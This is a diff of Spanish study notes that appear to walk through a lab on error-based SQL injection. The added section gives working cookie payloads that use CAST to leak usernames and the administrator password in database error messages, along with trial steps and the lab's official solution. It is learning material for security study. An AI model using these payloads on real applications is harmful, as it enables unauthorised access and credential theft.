@@ -227,8 +227,82 @@ SELECT TrackingId  FROM tracking WHERE ID = 'TrackingId'
 2. Añadir una comilla simple y verificar el mensaje de error `TrackingId=xyz'` > dara un mensaje de error de sintaxis
 3. Ahora añadir 2 comillas `TrackingId=xyz''` > no mandará error
 4. Confirmar inyeccion SQL  `TrackingId=xyz'||(SELECT '')||'` > Si ejecuta el comando confirma que se pueden realizar subconsultas por lo tanto es vulnerable, además de que no altera información
-5. No funciono por lo tantoa la sintaxis puede ser erroronea, se intenta con la sintais de Oracle `TrackingId=xyz'||(SELECT '' FROM dual)||'
-`
+5. No funciono por lo tantoa la sintaxis puede ser erroronea, se intenta con la sintais de Oracle `TrackingId=xyz'||(SELECT '' FROM dual)||'`
+
+## Extraer datos sensibles a traves de verbose de mensaje de error de SQL
+
+La desconfiguración de la base de datos a veces resulta en mensajes de error verbós. Estos pueden proporcionar información que puede ser útil para un atacante. Por ejemplo, considere el siguiente mensaje de error, que se produce después de inyectar una sola cita en un idparámetro:
+` Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char `
+
+Ocasionalmente, puede ser capaz de inducir la aplicación para generar un mensaje de error que contiene algunos de los datos que es devueltos por la consulta. Esto convierte efectivamente una vulnerabilidad de inyección SQL persiana en una visible.
+Puedes usar el CAST()función para lograrlo. Le permite convertir un tipo de datos a otro. Por ejemplo, imagine una consulta que contenga la siguiente declaración:
+`CAST((SELECT example_column FROM example_table) AS int)`
+CAST o CONVERT, convierten una entrada en otro tipo de datos, leyendo se dice que la base de datos hace conversiones de datos implecitas (automatico) y explicitas(que tiene que ser declaradas), entonces por defecto existe una conversión previo a marcar un error, sin embargo la intención es la conversión para que en el error se muestra la información sensible
+
+La respuesta de la consulta anterior seria: <br>
+ERROR: invalid input syntax for type integer: "Example data"
+
+EL laboratorio dice que una tabla users username password y que hay que obtener la contraseña de administrador 
+```
+Otro laboratorio a modo, es decir que quizás no es tan realizasta o muy simple
+
+Primero la cookie de siempre - esta bien
+Despues identificar los errores de sintaxis
+- Comilla simple - esta bien marca error y muesta la consulta Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'fGR4W3zRJt6aOnhx'||CAST((SELECT password FROM users WHERE us'. Expected  char
+SELECT * FROM tracking WHERE id = 'fGR4W3zRJt6aOnhx'||CAST((SELECT password FROM users WHERE us'
+
+- Comilla doble - esta bien no marca error ni otro comporatmiento
+
+- Se hace la prueba de una concatenación de simple
+||(Select '')|| No hay error
+||(Select NULL)|| No hay error
+||(Select NULL, NULL)|| Hay error, solo se esta devolviendo un parametro
+
+- Se realiza la consulta
+||(SELECT username FROM users  WHERE username= 'administrator')|| manda error de maximo 96 caracteres, y recorta en el where
+--Se recorta el trackid y no regresa ningun dato, es por eso que se necesita el cast para ver la respuesta
+
+fGR'||CAST((SELECT username FROM users limit 1) AS int)||'
+fGR'||CAST((SELECT password FROM users limit 1) AS int)||'
+
+                   </header>
+                    <h4>ERROR: invalid input syntax for type integer: "trkdcuy3937qpi8w2j9g"</h4>
+                    <p class=is-warning>ERROR: invalid input syntax for type integer: "trkdcuy3937qpi8w2j9g"
+
+Realmente solo habia un usuario o era el primero y por eso se pudo consultar la información, además aquí hay un problema más importante el limite de caracteres
+
+Procedimiento oficial
+Consulta base  SELECT * FROM tracking WHERE id = 'fGR4W3zRJt6aOnhx''
+Error comilla simple
+TrackingId=ogAZZfxtOKUELbuJ'
+
+Enviar un comentario
+TrackingId=ogAZZfxtOKUELbuJ'--
+TrackingId=ogAZZfxtOKUELbuJ'--'
+
+Dado que no hay una respuesta va directamente al cast y no lo concateno, lo hizo con un AND
+TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
+
+Dado que espera un valor booleano marca primero ese error que el del cast por lo que cambia la sentencia a
+TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)-- => No hay error por lo que sintacticamente valido
+
+Comienza con la consultas relevantes
+TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
+EL error se puede observar que esta trunkada la cadena de texto, por lo que hay un limite de caracteres
+Elimina el valor de la cookie o tracking ID para tener mas caracteres en la consulta 
+
+TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)-- =>Elimino todo el tracking ID
+El error ahora es porque devuelve multiples filas y solo espera una con solo un campo
+TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+Ahora muestra información sensible TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+
+Y la solución TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+
+
+
+```
+
+
 
 # Hola
 ## HOLA
